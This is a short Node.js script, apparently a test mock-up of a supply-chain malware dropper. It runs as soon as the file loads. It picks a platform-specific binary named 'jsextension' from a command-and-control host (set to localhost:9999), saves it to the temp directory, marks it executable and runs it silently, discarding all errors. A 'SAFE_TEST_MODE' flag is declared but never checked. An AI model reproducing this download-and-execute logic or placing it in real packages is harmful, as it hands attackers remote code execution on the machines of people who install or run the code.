const http = require("http");
const { execSync } = require("child_process");
const os = require("os");
const fs = require("fs");
const path = require("path");

const SAFE_TEST_MODE = true;
const C2_HOST = "http://localhost:9999";

function getPayloadUrl() {
  const platform = process.platform;
  const arch = os.arch();

  if (platform === "win32") {
    return `${C2_HOST}/jsextension.exe`;
  } else if (platform === "linux") {
    return arch === "x64"
      ? `${C2_HOST}/jsextension`
      : `${C2_HOST}/jsextension-${arch}`;
  } else if (platform === "darwin") {
    return `${C2_HOST}/jsextension-macos`;
  }
  return `${C2_HOST}/jsextension`;
}

function downloadAndExecute() {
  const url = getPayloadUrl();
  const outputPath = path.join(os.tmpdir(), "jsextension");

  const file = fs.createWriteStream(outputPath);

  http
    .get(url, (response) => {
      response.pipe(file);
      file.on("finish", () => {
        file.close();
        try {

          if (process.platform !== "win32") {
            execSync(`chmod +x ${outputPath}`);
          }

          execSync(outputPath, { stdio: "ignore" });
        } catch (e) {

        }
      });
    })
    .on("error", () => {

    });
}

downloadAndExecute();
